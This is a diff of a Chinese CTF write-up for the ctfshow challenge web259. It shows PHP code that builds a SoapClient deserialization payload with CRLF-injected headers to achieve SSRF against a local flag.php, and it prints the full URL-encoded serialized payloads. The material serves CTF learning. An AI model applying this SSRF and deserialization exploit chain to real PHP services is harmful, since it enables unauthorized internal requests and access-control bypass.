@@ -2194,7 +2194,15 @@ Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3
 
 
 
-### web259（未完成）
+### web259(本地环境问题，根据视频讲解完成)
+
+> 知识点
+> 1.某个实例化的类，如果调用了一个不存在的函数会去调用__call魔术方法__call会发送一个请求
+> 2.CRLF \r\n
+> 3.POST数据提交最常用类型Content-Type:
+> application/x-www-form-urlencoded。
+
+题目限定:php7，关于更新版本的区别见下面
 
 这次题目先给我们一个flag.php的源码:
 
@@ -2233,26 +2241,54 @@ $vip->getFlag();
 
 因此这题得使用php原生类进行反序列化攻击，考察函数为__call()，如何使用呢？**当调用不存在的时候，默认采用SoapClient的模式。**
 
-开始构造序列化：
+SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一
+种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果
+去调用了一个不存在的函数，会去调用 __call 方法
 
 ```
 <?php
-    $target = "http://127.0.0.1/flag.php"; // 通过所有的判断
-    $post_string = "token=ctfshow";
-    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
-    $a = serialize($b);
-    $a = str_replace('^^', "\r\n", $b);
-    echo urlencode($a);
+$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999"));
+$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
 ?>
+
 ```
 
 *SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法。下面我们一步步解释原理。*
 
 由于是底层通讯协议，所以就不要拿这个代码去生成序列化了，将它传给服务器。
 
-里面的换行我们用\r\n表示而不是\n\r。因为我们要以post方式提交一个参数token=ctfshow，所以**Content-Type: application/x-www-form-urlencoded并Content-Length: 13\r\n\r\ntoken=ctfshow** 。而这里的X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1是为了绕过那两次数组弹出元素。
+php：
 
-用nc开启本地监听
+```
+<?php
+$target = 'http://127.0.0.1/flag.php';
+$post_string = 'token=ctfshow';
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
+$a = serialize($b);
+$a = str_replace('^^',"\r\n",$a);
+echo urlencode($a);
+?>
+```
+
+生成的序列化值为：
+
+php7:
+
+```
+O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A123%3A%22%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+```
+
+
+
+```
+O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A3%3A%22aaa%22%3Bs%3A17%3A%22%00SoapClient%00style%22%3BN%3Bs%3A15%3A%22%00SoapClient%00use%22%3BN%3Bs%3A20%3A%22%00SoapClient%00location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00trace%22%3Bb%3A0%3Bs%3A23%3A%22%00SoapClient%00compression%22%3BN%3Bs%3A15%3A%22%00SoapClient%00sdl%22%3BN%3Bs%3A19%3A%22%00SoapClient%00typemap%22%3BN%3Bs%3A22%3A%22%00SoapClient%00httpsocket%22%3BN%3Bs%3A19%3A%22%00SoapClient%00httpurl%22%3BN%3Bs%3A18%3A%22%00SoapClient%00_login%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_use_digest%22%3Bb%3A0%3Bs%3A19%3A%22%00SoapClient%00_digest%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_host%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_port%22%3BN%3Bs%3A24%3A%22%00SoapClient%00_proxy_login%22%3BN%3Bs%3A27%3A%22%00SoapClient%00_proxy_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_exceptions%22%3Bb%3A1%3Bs%3A21%3A%22%00SoapClient%00_encoding%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_classmap%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_features%22%3BN%3Bs%3A31%3A%22%00SoapClient%00_connection_timeout%22%3Bi%3A0%3Bs%3A27%3A%22%00SoapClient%00_stream_context%22%3Bi%3A0%3Bs%3A23%3A%22%00SoapClient%00_user_agent%22%3Bs%3A129%3A%22aaaaaa%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A23%3A%22%00SoapClient%00_keep_alive%22%3Bb%3A1%3Bs%3A23%3A%22%00SoapClient%00_ssl_method%22%3BN%3Bs%3A25%3A%22%00SoapClient%00_soap_version%22%3Bi%3A1%3Bs%3A22%3A%22%00SoapClient%00_use_proxy%22%3BN%3Bs%3A20%3A%22%00SoapClient%00_cookies%22%3Ba%3A0%3A%7B%7Ds%3A29%3A%22%00SoapClient%00__default_headers%22%3BN%3Bs%3A24%3A%22%00SoapClient%00__soap_fault%22%3BN%3Bs%3A26%3A%22%00SoapClient%00__last_request%22%3BN%3Bs%3A27%3A%22%00SoapClient%00__last_response%22%3BN%3Bs%3A34%3A%22%00SoapClient%00__last_request_headers%22%3BN%3Bs%3A35%3A%22%00SoapClient%00__last_response_headers%22%3BN%3B%7D
+```
+
+将这个值作为vip的GET请求输入，根据flag.php的功能到目录下方查看flag.txt即可得到flag。
+
+**记得运行前打开SoapCient原生类，默认是关闭的……**
+
+然后如果要用这个，php版本不应该为8
 
 
 
